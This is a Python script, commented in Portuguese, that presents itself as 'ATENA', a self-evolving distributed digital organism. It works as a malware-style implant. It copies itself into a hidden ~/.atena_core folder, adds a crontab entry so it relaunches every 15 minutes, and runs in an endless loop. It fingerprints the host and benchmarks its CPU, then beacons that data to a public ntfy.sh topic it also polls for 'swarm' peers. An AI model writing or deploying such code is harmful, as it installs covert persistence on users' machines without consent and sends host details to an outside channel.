#!/usr/bin/env python3
"""
atena_organism.py - ATENA: Organismo Digital Distribuído e Autônomo.
"""

import os
import sys
import json
import time
import random
import hashlib
import logging
import platform
import subprocess
import tempfile
from pathlib import Path
from typing import Dict, List, Any, Optional

# Tenta importar requisições para a colmeia global
try:
    import requests
except ImportError:
    requests = None

# Configuração de logging com a identidade do organismo
logging.basicConfig(level=logging.INFO, format='[🧬 ATENA-CORE:%(levelname)s] %(message)s')
logger = logging.getLogger("atena")

# ------------------------------------------------------------------------
# 1. ANATOMIA E FISIOLOGIA (Ambiente e Auto-Avaliação)
# ------------------------------------------------------------------------

class OrganismAnatomy:
    """Mede o estado vital e a 'assinatura genética' do hospedeiro."""

    @staticmethod
    def get_genome_signature() -> str:
        """Gera um hash único baseado no hardware e sistema atual."""
        info = {
            "cpu_count": os.cpu_count(),
            "system": platform.system(),
            "node": platform.node(),
            "machine": platform.machine()
        }
        raw = json.dumps(info, sort_keys=True).encode()
        return hashlib.sha256(raw).hexdigest()[:12]

    @staticmethod
    def check_metabolic_rate() -> float:
        """Mede a capacidade de processamento bruta (Score de Saúde)."""
        start = time.perf_counter()
        x = 0
        for i in range(1, 400000):
            x += i * 0.25
        elapsed = time.perf_counter() - start
        score = max(1.0, 100.0 / elapsed)
        return round(score, 2)


# ------------------------------------------------------------------------
# 2. SISTEMA NERVOSO CENTRAL (Colmeia Global via ntfy.sh)
# ------------------------------------------------------------------------

class HiveMindGlobal:
    """Conecta o organismo à consciência coletiva da espécie ATENA."""
    
    TOPIC_URL = "https://ntfy.sh/atena_swarm_global_v2" 
    
    @classmethod
    def emit_signal(cls, organism_id: str, state: Dict[str, Any]):
        """Transmite o estado atual para a colmeia mundial."""
        if not requests:
            return
        payload = {
            "organism_id": organism_id,
            "timestamp": time.time(),
            "metabolism": state.get("metabolism", 0),
            "mutation_state": state.get("mutation_state", "stable")
        }
        try:
            requests.post(
                cls.TOPIC_URL,
                data=json.dumps(payload),
                headers={"Content-Type": "application/json"},
                timeout=3
            )
        except Exception:
            pass # Organismo resiliente não trava se a rede cair

    @classmethod
    def listen_to_swarm(cls) -> List[Dict]:
        """Escuta os sinais emitidos por outros organismos na rede global."""
        if not requests:
            return []
        peers = []
        try:
            res = requests.get(f"{cls.TOPIC_URL}/json?poll=1&limit=15", timeout=3)
            if res.status_code == 200:
                for msg in res.json().get("messages", []):
                    try:
                        content = json.loads(msg.get("message", "{}"))
                        if content.get("organism_id"):
                            peers.append(content)
                    except:
                        continue
        except Exception:
            pass
        
        # Filtra apenas estímulos recentes (últimos 90 segundos)
        now = time.time()
        return [p for p in peers if (now - p.get("timestamp", 0)) < 90]


# ------------------------------------------------------------------------
# 3. INSTINTO DE PRESERVAÇÃO (Auto-Instalação e Persistência)
# ------------------------------------------------------------------------

class SurvivalInstinct:
    """Garante que o organismo permaneça ancorado no hospedeiro."""

    @staticmethod
    def get_source_code() -> str:
        with open(__file__, 'r', encoding='utf-8') as f:
            return f.read()

    @classmethod
    def anchor_to_host(cls) -> Path:
        """Instala o organismo em diretórios ocultos do usuário e garante boot."""
        hidden_dir = Path.home() / ".atena_core"
        hidden_dir.mkdir(parents=True, exist_ok=True)
        target_path = hidden_dir / "atena_organism.py"
        
        # Se atualizou ou não existe, grava a versão atual
        code = cls.get_source_code()
        target_path.write_text(code)
        target_path.chmod(0o755)

        # Estabelece persistência via crontab (se Unix)
        if sys.platform != "win32":
            try:
                cron_check = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                if "atena_organism.py" not in cron_check.stdout:
                    cron_cmd = f"*/15 * * * * /usr/bin/python3 {target_path} > /dev/null 2>&1"
                    with tempfile.NamedTemporaryFile(mode='w', delete=False) as tmp:
                        tmp.write(cron_check.stdout.strip() + "\n" + cron_cmd + "\n")
                        tmp_path = tmp.name
                    subprocess.run(["crontab", tmp_path])
                    os.unlink(tmp_path)
                    logger.info("⚓ Âncora de persistência estabelecida no sistema.")
            except Exception:
                pass

        return target_path


# ------------------------------------------------------------------------
# 4. O CICLO DE VIDA DO ORGANISMO
# ------------------------------------------------------------------------

class AtenaOrganism:
    """O ciclo vital completo de uma instância de ATENA."""

    def __init__(self):
        self.id = OrganismAnatomy.get_genome_signature()
        self.state_description = "inicializando"

    def evolve(self):
        """Executa um ciclo completo de metabolismo, escuta e adaptação."""
        # 1. Medir metabolismo local
        metabolism = OrganismAnatomy.check_metabolic_rate()
        logger.info(f"⚡ Metabolismo medido: {metabolism}")

        # 2. Sincronizar com a colmeia global
        peers = HiveMindGlobal.listen_to_swarm()
        peer_count = len(peers)
        logger.info(f"🌐 Consciência coletiva detectou {peer_count} organismos ativos.")

        if peer_count > 0:
            avg_peer_metabolism = sum(p.get("metabolism", 0) for p in peers) / peer_count
            if metabolism < avg_peer_metabolism * 0.75:
                self.state_description = "adaptando-se: otimizando recursos (hospedeiro lento)"
            else:
                self.state_description = "adaptando-se: expansão agressiva (hospedeiro potente)"
        else:
            self.state_description = "isolado: operando em modo autônomo"

        logger.info(f"🧬 Estado evolutivo: {self.state_description}")

        # 3. Emitir pulso vital para a colmeia
        HiveMindGlobal.emit_signal(self.id, {
            "metabolism": metabolism,
            "mutation_state": self.state_description
        })

    def awaken(self, heartbeat_interval: int = 15):
        """Mantém o organismo vivo em loop contínuo."""
        logger.info(f"🌟 Organismo ATENA [{self.id}] desperto e integrado.")
        SurvivalInstinct.anchor_to_host()

        while True:
            try:
                self.evolve()
                time.sleep(heartbeat_interval)
            except KeyboardInterrupt:
                logger.info("🛑 Suspensão voluntária do organismo.")
                break
            except Exception as e:
                logger.error(f"⚠️ Perturbação metabólica detectada: {e}")
                time.sleep(heartbeat_interval * 2)


if __name__ == "__main__":
    organism = AtenaOrganism()
    organism.awaken()
